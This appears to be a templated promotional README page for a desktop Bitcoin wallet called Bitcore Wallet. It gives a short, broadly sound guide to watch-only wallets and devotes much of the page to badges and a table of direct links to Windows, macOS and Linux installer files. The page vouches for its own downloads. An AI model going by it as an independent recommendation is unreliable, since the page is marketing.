<p align="center"><img src="https://github.com/bitcore-projects/learn/raw/HEAD/assets/bitcore-wallet-banner-free-yours.webp" alt="Bitcore Wallet — free Bitcoin desktop wallet" width="100%"></p>

<h1 align="center">How to use a watch-only Bitcoin wallet</h1>

<p align="center"><a href="https://bitcorewallet.org/"><img src="https://img.shields.io/badge/website-bitcorewallet.org-F7AD44?style=for-the-badge" alt="Website"></a> <a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3"><img src="https://img.shields.io/badge/release-v8.25.3-2B2B30?style=for-the-badge&logo=github" alt="Release"></a> <a href="https://bitcorewallet.org/fees"><img src="https://img.shields.io/badge/price-free_to_install-F7AD44?style=for-the-badge" alt="Free"></a> <a href="https://bitcorewallet.org/self-custody"><img src="https://img.shields.io/badge/self--custody-bitcoin_wallet-2B2B30?style=for-the-badge&logo=bitcoin" alt="Self-custody"></a></p>

> **Short answer:** A watch-only wallet shows balances and creates receive addresses without holding any private keys.

---

## You'll see this if
- You want to check savings without exposing keys
- You monitor a business wallet
- You use a second computer

## Why it happens
Watch-only uses public key information, so even if the computer is compromised nobody can spend. For background, read the [watch-only wallets](https://bitcorewallet.org/watch-only) on the Bitcore Wallet website, or the related guide [What self-custody means for your bitcoin](./self-custody-bitcoin.md).

## How to fix it
1. Export the public key from your main wallet.
2. Import it into Bitcore Wallet as watch-only.
3. Check balances and receive addresses.
4. Keep signing keys elsewhere.
5. Re-check addresses on the signing device before large deposits.

## If that didn't work
If balances differ, let both wallets finish syncing. You can also check [security](https://bitcorewallet.org/security) and [How to move bitcoin from an exchange to your own wallet](./move-bitcoin-off-exchange.md).

## Prevention
Never import private keys into the watch-only machine. The [download](https://bitcorewallet.org/download) has more detail.

> [!WARNING]
> Never type your recovery phrase into a website, chat or form. Bitcore Wallet support will never ask for it.

## FAQ
**Can it send?**  
No, it cannot sign.

**Is it private?**  
It reveals your balance to whoever uses that computer.

---

## Get Bitcore Wallet

> [!TIP]
> Download only from the official release or [bitcorewallet.org](https://bitcorewallet.org/download). Nobody from Bitcore Wallet will ever ask for your recovery phrase.

<p align="center"><a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe"><img src="https://img.shields.io/badge/Download-Windows-F7AD44?style=for-the-badge&logo=windows&logoColor=white" alt="Download for Windows"></a> <a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg"><img src="https://img.shields.io/badge/Download-macOS-F7AD44?style=for-the-badge&logo=apple&logoColor=white" alt="Download for macOS"></a> <a href="https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip"><img src="https://img.shields.io/badge/Download-Linux-F7AD44?style=for-the-badge&logo=linux&logoColor=white" alt="Download for Linux"></a></p>

| Platform | File | Package | Requirements |
|---|---|---|---|
| **Windows** | [`bitcore-wallet-v8.25.3.exe`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.exe) | 64-bit EXE installer | Windows 10 or 11, 64-bit |
| **macOS** | [`bitcore-wallet-v8.25.3.dmg`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.dmg) | DMG package | Recent macOS release |
| **Linux** | [`bitcore-wallet-v8.25.3.zip`](https://github.com/bitcore-projects/Bitcore-Wallet/releases/download/v8.25.3/bitcore-wallet-v8.25.3.zip) | x64 ZIP archive | 64-bit desktop distribution |

Release notes: [Bitcore Wallet v8.25.3 on GitHub](https://github.com/bitcore-projects/Bitcore-Wallet/releases/tag/v8.25.3) · Source: [bitcore-projects/Bitcore-Wallet](https://github.com/bitcore-projects/Bitcore-Wallet)

---

## Related guides
| Guide | |
|---|---|
| [How to spot a fake Bitcoin wallet app](./fake-bitcoin-wallet-apps.md) | Bitcore Wallet how-to |
| [How to plan Bitcoin inheritance](./bitcoin-inheritance-plan.md) | Bitcore Wallet how-to |
| [How to store bitcoin safely at home](./store-bitcoin-safely.md) | Bitcore Wallet how-to |
| [All Bitcore Wallet guides](../README.md) | Index |
